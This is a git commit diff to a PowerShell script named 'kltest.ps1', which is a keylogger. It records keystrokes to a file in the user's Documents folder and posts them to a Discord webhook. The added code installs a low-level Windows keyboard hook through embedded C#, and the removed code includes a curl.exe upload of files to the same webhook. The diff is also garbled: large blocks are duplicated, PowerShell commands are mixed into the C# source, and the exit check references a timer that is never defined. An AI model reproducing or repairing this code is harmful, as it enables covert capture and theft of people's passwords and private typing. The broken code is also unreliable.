78321b50ffa3170f7099b13554b82966a32e83b2
Wesley5n1p35 <47337218+Wesley5n1p35@users.noreply.github.com>
2023-10-30 11:40:24 -0500

    Update kltest.ps1

--- kltest.ps1
+++ kltest.ps1
@@ -6,23 +6,7 @@ $lastKeystrokeTime = [System.DateTime]::Now
 
 # Function to upload data to Discord
 function Upload-Discord {
-    [CmdletBinding()]
     param (
-        [parameter(Position=0, Mandatory=$False)]
-        [string]$file,
-        [parameter(Position=1, Mandatory=$False)]# Define the log file path
-$logFilePath = "$env:USERPROFILE\Documents\keylog.txt"
-
-# Initialize the last keystroke time
-$lastKeystrokeTime = [System.DateTime]::Now
-
-# Function to upload data to Discord
-function Upload-Discord {
-    [CmdletBinding()]
-    param (
-        [parameter(Position=0, Mandatory=$False)]
-        [string]$file,
-        [parameter(Position=1, Mandatory=$False)]
         [string]$text
     )
 
@@ -33,10 +17,6 @@ function Upload-Discord {
 
     if (-not [string]::IsNullOrEmpty($text)) {
         Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl -Method Post -Body ($Body | ConvertTo-Json)
-    }
-
-    if (-not [string]::IsNullOrEmpty($file)) {
-        curl.exe -F "file1=@$file" $hookurl
     }
 }
 
@@ -49,88 +29,98 @@ if (-not (Test-Path -Path $logFilePath)) {
     }
 }
 
-# Event handler for keypress
-$OnKeyPress = {
-    param (
-        $key
-    )
-    $now = [System.DateTime]::Now
-    $elapsedTime = $now - $lastKeystrokeTime
-    $lastKeystrokeTime = $now
+# Initialize the keylogger
+Add-Type -TypeDefinition @"
+using System;
+using System.Runtime.InteropServices;
+using System.Windows.Forms;
 
-    # Log the key
-    Add-Content -Path $logFilePath -Value $key
+public class InterceptKeys {
+    private const int WH_KEYBOARD_LL = 13;
+    private const int WM_KEYDOWN = 0x0100;
+    private static LowLevelKeyboardProc _proc = HookCallback;
+    private static IntPtr _hookID = IntPtr.Zero;
 
-    # If there's no typing activity for 60 seconds, send the content to Discord
-    if ($elapsedTime.TotalSeconds -ge 60) {
-        $text = Get-Content -Path $logFilePath
-        Upload-Discord -text $text
-        Clear-Content -Path $logFilePath
+    public delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
+
+    public static void Main() {
+        _hookID = SetHook(_proc);
+        Application.Run();
     }
-}
 
-# Register the keypress event
-Register-WmiEvent -Class Win32_Keyboard -Action $OnKeyPress
+    private static IntPtr SetHook(LowLevelKeyboardProc proc) {
+        using (Process curProcess = Process.GetCurrentProcess())
+        using (ProcessModule curModule = curProcess.MainModule) {
+            return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
+        }
+    }
+
+    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
+        if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {
+            int vkCode = Marshal.ReadInt32(lParam);
+            char keyChar = (char)vkCode;
+            string key = keyChar.ToString();
+            Add-Content -Path "$logFilePath" -Value $key;  # Log the key to the file
+            Upload-Discord -text $key;  # Upload the key to Discord
+        }
+        return CallNextHookEx(_hookID, nCode, wParam, lParam);
+    }
+
+    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
+
+    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+    [return: MarshalAs(UnmanagedType.Bool)]
+    private static extern bool UnhookWindowsHookEx(IntPtr hhk);
+
+    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
+
+    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+    private static extern IntPtr GetModuleHandle(string lpModuleName);
+}
+"@
+
+# Start the keylogger
+[InterceptKeys]::Main()
+
+    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
+        if (nCode >= 0 && (wParam == (IntPtr)WM_KEYDOWN)) {
+            int vkCode = Marshal.ReadInt32(lParam);
+            char keyChar = (char)vkCode;
+            string key = keyChar.ToString();
+            AddContent("$logFilePath", key);  // Log the key to the file defined earlier
+            Upload-Discord -text $key;  // Upload the key to Discord
+        }
+        return CallNextHookEx(_hookID, nCode, wParam, lParam);
+    }
+
+    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);
+
+    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+    [return: MarshalAs(UnmanagedType.Bool)]
+    private static extern bool UnhookWindowsHookEx(IntPtr hhk);
+
+    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
+
+    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+    private static extern IntPtr GetModuleHandle(string lpModuleName);
+}
+"@
+
+# Initialize the key logger
+[InterceptKeys]::Main()
 
 # Start the script and wait for Ctrl+Alt+0 to stop
 Write-Host "Monitoring keystrokes. Press Ctrl+Alt+0 to stop."
 
 while ($true) {
     $key = [Console]::ReadKey()
-    if (($key.Modifiers -eq [ConsoleModifiers]::Control -and $key.Key -eq "0") -and ($key.Modifiers -eq [ConsoleModifiers]::Alt -and $key.Key -eq "0")) {
-        # Unregister the event and exit
-        Unregister-Event -SourceIdentifier (Get-EventSubscriber -SourceIdentifier "keyPress")
-        break
-    }
-}
-        [string]$text
-    )
-
-    $hookurl = "$dc"
-    $Body = @{
-        'keylog' = $text
-    }
-
-    if (-not [string]::IsNullOrEmpty($text)) {
-        Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl -Method Post -Body ($Body | ConvertTo-Json)
-    }
-
-    if (-not [string]::IsNullOrEmpty($file)) {
-        curl.exe -F "file1=@$file" $hookurl
-    }
-}
-
-# Event handler for keypress
-$OnKeyPress = {
-    param (
-        $key
-    )
-    $now = [System.DateTime]::Now
-    $elapsedTime = $now - $lastKeystrokeTime
-    $lastKeystrokeTime = $now
-
-    # Log the key
-    Add-Content -Path $logFilePath -Value $key
-
-    # If there's no typing activity for 60 seconds, send the content to Discord
-    if ($elapsedTime.TotalSeconds -ge 60) {
-        $text = Get-Content -Path $logFilePath
-        Upload-Discord -text $text
-        Clear-Content -Path $logFilePath
-    }
-}
-
-# Register the keypress event
-Register-WmiEvent -Class Win32_Keyboard -Action $OnKeyPress
-
-# Start the script and wait for Ctrl+Alt+0 to stop
-Write-Host "Monitoring keystrokes. Press Ctrl+Alt+0 to stop."
-
-while ($true) {
-    $key = [Console]::ReadKey()
-    if (($key.Modifiers -eq [ConsoleModifiers]::Control -and $key.Key -eq "0") -and ($key.Modifiers -eq [ConsoleModifiers]::Alt -and $key.Key -eq "0")) {
-        # Unregister the event and exit
-        Unregister-Event -SourceIdentifier (Get-EventSubscriber -SourceIdentifier "keyPress")
+    if (($key.Modifiers -eq [ConsoleModifiers]::Control -and $key.Key -eq "D0") -and ($key.Modifiers -eq [ConsoleModifiers]::Alt -and $key.Key -eq "D0")) {
+        # Stop the script and unregister events
+        $timer.Stop()
         break
     }
 }
